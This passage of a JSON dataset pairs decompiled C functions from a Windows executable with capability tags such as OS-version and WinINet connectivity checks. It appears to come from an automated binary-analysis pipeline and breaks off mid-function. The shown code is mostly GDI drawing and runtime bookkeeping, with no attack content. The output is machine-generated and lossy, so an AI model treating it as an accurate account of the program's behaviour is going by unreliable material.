        "decompiled_code": "\nvoid __cdecl fcn.004252c8(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uchar in_CL;\n    int32_t **in_FS_OFFSET;\n    int32_t *piVar2;\n    int32_t *piStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x4252de;\n    fcn.004058ec();\n    uStack28 = 0x425355;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    fcn.00406f3c();\n    *(in_EAX + 0x44) = in_CL;\n    piVar2 = *(in_EAX + 0x18);\n    uVar1 = (**(*piVar2 + 0xc))(piVar2, *(in_EAX + 0x14));\n    if ((uVar1 & 0x80000000) == 0) {\n        uVar1 = fcn.00424e8c(in_EAX + 0x38);\n        if ((uVar1 & 0x80000000) == 0) {\n            fcn.004255a8();\n            if (arg_8h != '\\0') {\n                fcn.004252bc();\n            }\n        }\n    }\n    *in_FS_OFFSET = piVar2;\n    piStack32 = 0x42535c;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 355
    },
    "00425368": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00425368(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack304;\n    uint uStack300;\n    uchar *puStack296;\n    uint var_118h;\n    uint var_114h;\n    int32_t var_110h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    var_8h = NULL;\n    var_ch = NULL;\n    puStack296 = 0x425393;\n    fcn.00405f08();\n    uStack300 = 0x4254b6;\n    piStack304 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed0;\n    puStack296 = &stack0xfffffffc;\n    fcn.00406f3c();\n    fcn.00406f3c();\n    uVar1 = fcn.00406f3c();\n    iVar2 = (**(*param_2 + 0x28))(param_2, uVar1);\n    while (iVar2 == 0) {\n        uVar1 = fcn.00406f3c(&fcn.00425368::var_118h);\n        iVar2 = (**(*var_4h + 0xc))(var_4h, 1, uVar1);\n        if ((iVar2 == 0) && (var_8h != NULL)) {\n            uVar1 = fcn.00406f3c();\n            iVar2 = (**(*var_8h + 0x18))(var_8h, uVar1);\n            if ((iVar2 == 0) && (var_ch != NULL)) {\n                uVar1 = fcn.00405fd8();\n                iVar2 = (**(*var_ch + 0x20))(var_ch, uVar1);\n                if ((iVar2 == 0) && (var_110h == 0)) {\n                    fcn.00425368();\n                    (**(**(in_EAX + 0x14) + 0x24))(*(in_EAX + 0x14), var_ch);\n                    (**(**(in_EAX + 0x14) + 0x24))(*(in_EAX + 0x14), var_8h);\n                    (**(**(in_EAX + 0x14) + 0x10))(*(in_EAX + 0x14), var_114h);\n                }\n            }\n        }\n    }\n    *in_FS_OFFSET = param_2;\n    piStack304 = 0x4254bd;\n    fcn.00405fd8();\n    fcn.00406024();\n    fcn.00406f3c();\n    return;\n}\n",
        "token_count": 634
    },
    "004254dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004254dc(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x34) != 0) {\n        (**(**(in_EAX + 0x34) + 0x24))(*(in_EAX + 0x34), 0, 1);\n    }\n    if (*(in_EAX + 0xc) != 0) {\n        (**(**(in_EAX + 0xc) + 0x3c))(*(in_EAX + 0xc));\n    }\n    *(in_EAX + 0x1c) = 0;\n    if (*(in_EAX + 0x10) != 0) {\n        (**(**(in_EAX + 0x10) + 0x34))(*(in_EAX + 0x10), 0, 0x8001, 0);\n    }\n    if (*(in_EAX + 8) != 0) {\n        (**(**(in_EAX + 8) + 0x4c))(*(in_EAX + 8), 0);\n        (**(**(in_EAX + 8) + 0x74))(*(in_EAX + 8), 0);\n    }\n    return;\n}\n",
        "token_count": 274
    },
    "0042553c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042553c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = 0;\n    if (*(in_EAX + 0xc) != 0) {\n        if (param_2 == '\\0') {\n            uVar1 = (**(**(in_EAX + 0xc) + 0x24))(*(in_EAX + 0xc));\n            *(in_EAX + 0x1c) = 0;\n        }\n        else if (*(in_EAX + 0x1c) != '\\x02') {\n            uVar1 = (**(**(in_EAX + 0xc) + 0x1c))(*(in_EAX + 0xc));\n            *(in_EAX + 0x1c) = 2;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 200
    },
    "004255a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004255a8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint *in_FS_OFFSET;\n    uint uStack220;\n    uint uStack216;\n    uchar *puStack212;\n    uint var_c0h;\n    uint var_a8h;\n    int32_t *var_28h;\n    int32_t var_24h;\n    uint var_1dh;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    int32_t *var_4h;\n    \n    puStack212 = &stack0xfffffffc;\n    var_4h = NULL;\n    uStack216 = 0x42584a;\n    uStack220 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff24;\n    fcn.00406858(0);\n    var_8h = fcn.00425570();\n    if (var_8h == 0) {\n        var_8h = (**(*var_4h + 0x14))(var_4h, &fcn.004255a8::var_18h, &fcn.004255a8::var_1dh + 1);\n    }\n    var_14h = 0;\n    if ((var_8h == 0) && (-1 < var_18h + -1)) {\n        var_24h = var_18h;\n        iVar3 = 0;\n        do {\n            var_ch = &fcn.004255a8::var_a8h;\n            var_8h = (**(*var_4h + 0x18))(var_4h, iVar3, &fcn.004255a8::var_10h, var_ch);\n            iVar2 = *(var_10h + 0x10);\n            var_28h = var_ch + 5;\n            if (((var_8h & 0x80000000) == 0) &&\n               (((cVar1 = fcn.0042467c(),  cVar1 != '\\0' || (iVar2 == 0x47504a4d)) ||\n                ((((iVar2 == 0x32595559 || ((iVar2 == 0x564e5559 || (iVar2 == 0x56595559)))) &&\n                  (*var_28h * var_28h[1] * 2 == *(var_10h + 0x28))) ||\n                 ((((iVar2 == 0x30323449 || (iVar2 == 0x32315659)) || (iVar2 == 0x56555949)) &&\n                  (*var_28h * var_28h[1] * 3 >> 1 == *(var_10h + 0x28))))))))) {\n                fcn.00406858(var_14h + 1);\n                iVar2 = var_14h;\n                *(*(in_EAX + 0x50) + 0xc + var_14h * 0x18) = iVar3;\n                *(*(in_EAX + 0x50) + var_14h * 0x18) = *var_28h;\n                *(*(in_EAX + 0x50) + 4 + var_14h * 0x18) = var_28h[1];\n                *(*(in_EAX + 0x50) + 0x10 + var_14h * 0x18) = var_10h;\n                *(*(in_EAX + 0x50) + 8 + var_14h * 0x18) = *(var_10h + 0x28);\n                cVar1 = fcn.0042467c();\n                if (cVar1 == '\\0') {\n                    fcn.004030ec();\n                }\n                else {\n                    *(*(in_EAX + 0x50) + 0x14 + iVar2 * 0x18) = *0x42585c;\n                }\n                var_14h = var_14h + 1;\n            }\n            iVar3 = iVar3 + 1;\n            var_24h = var_24h + -1;\n        } while (var_24h != 0);\n    }\n    if (1 < var_14h) {\n        do {\n            var_1dh._0_1_ = '\\0';\n            if (-1 < var_14h + -2) {\n                var_24h = var_14h + -1;\n                iVar3 = 0;\n                do {\n                    if ((*(*(in_EAX + 0x50) + 0x18 + iVar3 * 0x18) < *(*(in_EAX + 0x50) + iVar3 * 0x18)) ||\n                       ((*(*(in_EAX + 0x50) + iVar3 * 0x18) == *(*(in_EAX + 0x50) + 0x18 + iVar3 * 0x18) &&\n                        (*(*(in_EAX + 0x50) + 0x1c + iVar3 * 0x18) < *(*(in_EAX + 0x50) + 4 + iVar3 * 0x18))))) {\n                        var_1dh._0_1_ = '\\x01';\n                        puVar4 = *(in_EAX + 0x50) + iVar3 * 0x18;\n                        puVar5 = &fcn.004255a8::var_c0h;\n                        for (iVar2 = 6; iVar2 != 0; iVar2 = iVar2 + -1) {\n                            *puVar5 = *puVar4;\n                            puVar4 = puVar4 + 1;\n                            puVar5 = puVar5 + 1;\n                        }\n                        puVar4 = *(in_EAX + 0x50) + 0x18 + iVar3 * 0x18;\n                        puVar5 = *(in_EAX + 0x50) + iVar3 * 0x18;\n                        for (iVar2 = 6; iVar2 != 0; iVar2 = iVar2 + -1) {\n                            *puVar5 = *puVar4;\n                            puVar4 = puVar4 + 1;\n                            puVar5 = puVar5 + 1;\n                        }\n                        puVar4 = &fcn.004255a8::var_c0h;\n                        puVar5 = *(in_EAX + 0x50) + 0x18 + iVar3 * 0x18;\n                        for (iVar2 = 6; iVar2 != 0; iVar2 = iVar2 + -1) {\n                            *puVar5 = *puVar4;\n                            puVar4 = puVar4 + 1;\n                            puVar5 = puVar5 + 1;\n                        }\n                    }\n                    iVar3 = iVar3 + 1;\n                    var_24h = var_24h + -1;\n                } while (var_24h != 0);\n            }\n        } while (var_1dh != '\\0');\n    }\n    *in_FS_OFFSET = uStack220;\n    puStack212 = 0x425851;\n    uStack216 = 0x425849;\n    fcn.00406f3c();\n    return;\n}\n",
        "token_count": 1636
    },
    "00426e80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00426e80(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint *var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x426e9b;\n    iVar2 = fcn.00426df4();\n    puStack24 = 0x426ea5;\n    fcn.00426e68();\n    uStack28 = 0x426f54;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    for (var_8h = *(in_EAX + 4); var_8h != NULL; var_8h = *var_8h) {\n        if (iVar2 == *(var_8h + 3)) {\n            cVar1 = fcn.00409850();\n            if (cVar1 != '\\0') break;\n        }\n    }\n    if (var_8h == NULL) {\n        var_8h = fcn.00402ef0();\n        *var_8h = *(in_EAX + 4);\n        var_8h[1] = 0;\n        var_8h[2] = *param_2;\n        *(var_8h + 3) = iVar2;\n        fcn.004030ec();\n        *(in_EAX + 4) = var_8h;\n    }\n    var_8h[1] = var_8h[1] + 1;\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x426f5b;\n    uStack28 = 0x426f53;\n    fcn.00426e74();\n    return;\n}\n",
        "token_count": 430
    },
    "00426f64": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00426f64(uint param_1, uint *param_2)\n\n{\n    uint *puVar1;\n    int32_t in_EAX;\n    uint *puVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (param_2 == NULL) {\n        return;\n    }\n    uStack28 = 0x426f89;\n    fcn.00426e68();\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    param_2[1] = param_2[1] + -1;\n    if (param_2[1] == 0) {\n        puVar1 = *(in_EAX + 4);\n        if (*(in_EAX + 4) == param_2) {\n            *(in_EAX + 4) = *param_2;\n        }\n        else {\n            do {\n                puVar2 = puVar1;\n                puVar1 = *puVar2;\n            } while (puVar1 != param_2);\n            *puVar2 = *param_2;\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    uStack28 = 0x426ff3;\n    uStack32 = 0x426feb;\n    fcn.00426e74();\n    return;\n}\n",
        "token_count": 326
    },
    "00427120": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00427120(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x427132;\n    fcn.00426e68();\n    uStack28 = 0x427180;\n    iVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    for (puVar2 = *(in_EAX + 4); puVar2 != NULL; puVar2 = *puVar2) {\n        iStack32 = puVar2[2];\n        if ((iStack32 != 0) && (puVar2[5] < 0)) {\n            sub.gdi32.dll_DeleteObject();\n            puVar2[2] = 0;\n            iVar1 = iStack32;\n        }\n        iStack32 = iVar1;\n        iVar1 = iStack32;\n    }\n    *in_FS_OFFSET = iVar1;\n    puStack24 = 0x427187;\n    uStack28 = 0x42717f;\n    iStack32 = iVar1;\n    fcn.00426e74();\n    return;\n}\n",
        "token_count": 301
    },
    "004276ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004276ac(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 10) != 0) {\n        (**(in_EAX + 8))();\n    }\n    return;\n}\n",
        "token_count": 52
    },
    "0042814c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042814c(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t *in_FS_OFFSET;\n    uint *puStack40;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = *(in_EAX + 0x10);\n    if (*(var_4h + 8) == 0) {\n        puStack28 = 0x42816b;\n        fcn.00426e68();\n        uStack32 = 0x4281d2;\n        iStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        puStack28 = &stack0xfffffffc;\n        if (*(var_4h + 8) == 0) {\n            var_14h = *(*(var_4h + 0x1c) * 2 + 0x4a1f58);\n            var_10h = *(var_4h + 0x18);\n            puStack28 = &stack0xfffffffc;\n            var_8h = fcn.0042767c();\n            puStack40 = &fcn.0042814c::var_14h;\n            uVar1 = sub.gdi32.dll_CreatePenIndirect();\n            *(var_4h + 8) = uVar1;\n        }\n        *in_FS_OFFSET = puStack40;\n        uStack32 = 0x4281d9;\n        iStack36 = 0x4281d1;\n        uVar1 = fcn.00426e74();\n        return uVar1;\n    }\n    return *(var_4h + 8);\n}\n",
        "token_count": 404
    },
    "00428438": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00428438(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint *puStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = *(in_EAX + 0x10);\n    if (*(var_4h + 8) == 0) {\n        puStack24 = 0x42845b;\n        fcn.00426e68();\n        uStack28 = 0x428506;\n        puStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        if (*(var_4h + 8) == 0) {\n            if (*(var_4h + 0x18) == NULL) {\n                var_8h = 0;\n                uVar1 = *(var_4h + 0x1c);\n                if (uVar1 == 0) {\n                    var_10h = 0;\n                    puStack24 = &stack0xfffffffc;\n                }\n                else if (uVar1 == 1) {\n                    var_10h = 1;\n                    puStack24 = &stack0xfffffffc;\n                }\n                else {\n                    var_10h = 2;\n                    var_8h = (uVar1 & 0x7f) - 2;\n                    puStack24 = &stack0xfffffffc;\n                }\n            }\n            else {\n                var_10h = 3;\n                puStack24 = &stack0xfffffffc;\n                (**(**(var_4h + 0x18) + 0x70))();\n                var_8h = (**(**(var_4h + 0x18) + 0x68))();\n            }\n            var_ch = fcn.0042767c();\n            puStack32 = &fcn.00428438::var_10h;\n            uVar2 = sub.gdi32.dll_CreateBrushIndirect();\n            *(var_4h + 8) = uVar2;\n        }\n        *in_FS_OFFSET = puStack32;\n        puStack24 = 0x42850d;\n        uStack28 = 0x428505;\n        uVar2 = fcn.00426e74();\n        return uVar2;\n    }\n    return *(var_4h + 8);\n}\n",
        "token_count": 553
    },
    "004288ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.004288ac(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uchar *puStack20;\n    uchar auStack16 [8];\n    \n    uVar2 = 0;\n    if ((*(in_EAX + 0x54) & 0x80) != 0) {\n        iVar1 = fcn.00428b60();\n        sub.gdi32.dll_GetWindowOrgEx();\n        puStack20 = auStack16;\n        if (iVar1 != 0) {\n            uVar2 = 1;\n            puStack20 = auStack16;\n        }\n    }\n    return CONCAT44(puStack20, uVar2);\n}\n",
        "token_count": 157
    },
    "004289f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid fcn.004289f8(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    uint var_1h;\n    \n    uStack16 = 0x4aaa50;\n    puStack20 = 0x428a09;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack24 = 0x428a44;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (*(in_EAX + 0x50) == 0) {\n        puStack20 = &fcn.004289f8::var_1h + 1;\n        fcn.0042881c();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x428a4b;\n    uStack24 = 0x4aaa50;\n    uStack28 = 0x428a43;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 252
    },
    "00428f74": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00428f74(char param_1, uint *param_2)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffff44;\n    int32_t iStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint *puStack92;\n    int32_t iStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint lpvObject;\n    uint var_30h;\n    uint var_2ch;\n    uint hdcDest;\n    int32_t var_18h;\n    int32_t hdc;\n    int32_t var_10h;\n    uint nWidth;\n    uint nHeight;\n    uint hgdiobj;\n    \n    nWidth = *param_2;\n    nHeight = param_2[1];\n    uStack72 = 0;\n    uStack76 = 0x428f90;\n    hgdiobj = in_EAX;\n    var_18h = sub.gdi32.dll_CreateCompatibleDC();\n    uStack76 = 0;\n    puStack80 = 0x428f9a;\n    hdcDest = sub.gdi32.dll_CreateCompatibleDC();\n    uStack84 = 0x4290c2;\n    iStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack92 = &fcn.00428f74::lpvObject;\n    uStack96 = 0x18;\n    uStack100 = hgdiobj;\n    uStack104 = 0x428fba;\n    puStack80 = &stack0xfffffffc;\n    sub.gdi32.dll_GetObjectA();\n    if (param_1 != '\\0') {\n        uStack104 = 0;\n        puStack108 = 0x1;\n        uStack112 = 1;\n        iStack116 = nHeight;\n        var_10h = sub.gdi32.dll_CreateBitmap(nWidth);\n        if (var_10h != 0) {\n            iVar1 = sub.gdi32.dll_SelectObject(var_18h, hgdiobj);\n            iVar2 = sub.gdi32.dll_SelectObject(hdcDest, var_10h);\n            sub.gdi32.dll_StretchBlt(hdcDest, 0, 0, nWidth, nHeight, var_18h, 0, 0, var_30h, var_2ch, 0xcc0020);\n            if (iVar1 != 0) {\n                in_stack_ffffff44 = var_18h;\n                sub.gdi32.dll_SelectObject(var_18h, iVar1);\n            }\n            if (iVar2 != 0) {\n                sub.gdi32.dll_SelectObject(hdcDest, iVar2);\n            }\n        }\n        *in_FS_OFFSET = in_stack_ffffff44;\n        sub.gdi32.dll_DeleteDC(var_18h, 0x4290c9);\n        sub.gdi32.dll_DeleteDC(hdcDest);\n        return;\n    }\n    uStack104 = 0;\n    puStack108 = 0x428fdd;\n    hdc = sub.user32.dll_GetDC();\n    if (hdc == 0) {\n        puStack108 = 0x428feb;\n        fcn.00428ebc();\n    }\n    uStack112 = 0x429031;\n    iStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    iVar1 = hdc;\n    puStack108 = &stack0xfffffffc;\n    var_10h = sub.gdi32.dll_CreateCompatibleBitmap(hdc, nWidth, nHeight);\n    if (var_10h == 0) {\n        fcn.00428ebc();\n    }\n    *in_FS_OFFSET = iVar1;\n    sub.user32.dll_ReleaseDC(0, hdc, 0x429038);\n    return;\n}\n",
        "token_count": 879
    },
    "00429114": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00429114(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h, \n            uint hdc, int32_t arg_28h, int32_t arg_2ch)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    uint uStack84;\n    uint uStack80;\n    uchar *puStack76;\n    int32_t iStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    int32_t hpal;\n    uint var_20h;\n    uint crColor;\n    uint var_18h;\n    uint hgdiobj;\n    uint hdcDest;\n    uint nYOriginDest;\n    uint nXOriginDest;\n    \n    if (((**0x4a5164 == 2) && (arg_18h == arg_2ch)) && (arg_14h == arg_28h)) {\n        uStack56 = 1;\n        puStack60 = 0x1;\n        uStack64 = hdc;\n        uStack68 = 0x42915c;\n        sub.gdi32.dll_CreateCompatibleBitmap();\n        uStack68 = 0x429161;\n        uStack68 = fcn.00428f64();\n        iStack72 = arg_10h;\n        puStack76 = 0x429171;\n        uVar1 = sub.gdi32.dll_SelectObject();\n        uStack80 = 0x4291dc;\n        uStack84 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffac;\n        uVar5 = 0xccaa0029;\n        uVar2 = uVar1;\n        puStack76 = &stack0xfffffffc;\n        sub.gdi32.dll_MaskBlt();\n        *in_FS_OFFSET = in_EAX;\n        uVar2 = sub.gdi32.dll_SelectObject\n                          (arg_10h, uVar1, 0x429390, arg_2ch, arg_28h, hdc, arg_20h, arg_1ch, uVar2, arg_ch, arg_8h, \n                           uVar5);\n        sub.gdi32.dll_DeleteObject(uVar2);\n        return;\n    }\n    uStack56 = 0;\n    puStack60 = 0x4291ef;\n    sub.gdi32.dll_CreateCompatibleDC();\n    puStack60 = 0x4291f4;\n    uVar2 = fcn.00428f64();\n    uStack64 = 0x429389;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    iStack72 = arg_14h;\n    puStack76 = arg_18h;\n    uStack80 = hdc;\n    uStack84 = 0x429210;\n    puStack60 = &stack0xfffffffc;\n    sub.gdi32.dll_CreateCompatibleBitmap();\n    uStack84 = 0x429215;\n    uVar1 = fcn.00428f64();\n    uStack84 = uVar1;\n    iVar3 = sub.gdi32.dll_SelectObject(uVar2);\n    iVar4 = sub.gdi32.dll_SelectPalette(hdc, *0x4aaa1c, 0);\n    sub.gdi32.dll_SelectPalette(hdc, iVar4, 0);\n    if (iVar4 == 0) {\n        hpal = sub.gdi32.dll_SelectPalette(uVar2, *0x4aaa1c, 0xffffffff);\n    }\n    else {\n        hpal = sub.gdi32.dll_SelectPalette(uVar2, iVar4, 0xffffffff);\n    }\n    sub.gdi32.dll_RealizePalette(uVar2);\n    sub.gdi32.dll_StretchBlt(uVar2, 0, 0, arg_18h, arg_14h, arg_10h, arg_ch, arg_8h, arg_18h, arg_14h, 0xcc0020);\n    sub.gdi32.dll_StretchBlt(uVar2, 0, 0, arg_18h, arg_14h, hdc, arg_20h, arg_1ch, arg_18h, arg_14h, 0x440328);\n    sub.gdi32.dll_SetTextColor();\n    sub.gdi32.dll_SetBkColor();\n    sub.gdi32.dll_StretchBlt();\n    sub.gdi32.dll_StretchBlt();\n    sub.gdi32.dll_SetTextColor();\n    sub.gdi32.dll_SetBkColor();\n    if (iVar3 != 0) {\n        sub.gdi32.dll_SelectObject(uVar2, iVar3);\n    }\n    sub.gdi32.dll_DeleteObject();\n    *in_FS_OFFSET = uVar1;\n    if (hpal != 0) {\n        sub.gdi32.dll_SelectPalette(uVar2, hpal, 0, 0x429390);\n    }\n    sub.gdi32.dll_DeleteDC(uVar2);\n    return;\n}\n",
        "token_count": 1135
    },
    "004295c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004295c4(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffb8;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint uStack20;\n    uint hdc;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    if (*0x4aaa1c != 0) {\n        uStack20 = 0;\n        puStack24 = 0x4295e1;\n        uVar1 = sub.user32.dll_GetDC();\n        uStack28 = 0x42964a;\n        iStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        puStack24 = &fcn.004295c4::var_1h + 1;\n        iVar2 = sub.gdi32.dll_GetDeviceCaps(uVar1, 0x68);\n        if (0xf < iVar2) {\n            sub.gdi32.dll_GetPaletteEntries(*0x4aaa1c, 0, 8, in_EAX + 4);\n            in_stack_ffffffb8 = *0x4aaa1c;\n            sub.gdi32.dll_GetPaletteEntries(*0x4aaa1c, 8, 8, in_EAX + -0x1c + *(in_EAX + 2) * 4);\n            var_1h._0_1_ = 1;\n        }\n        *in_FS_OFFSET = in_stack_ffffffb8;\n        uVar1 = sub.user32.dll_ReleaseDC(0, uVar1, 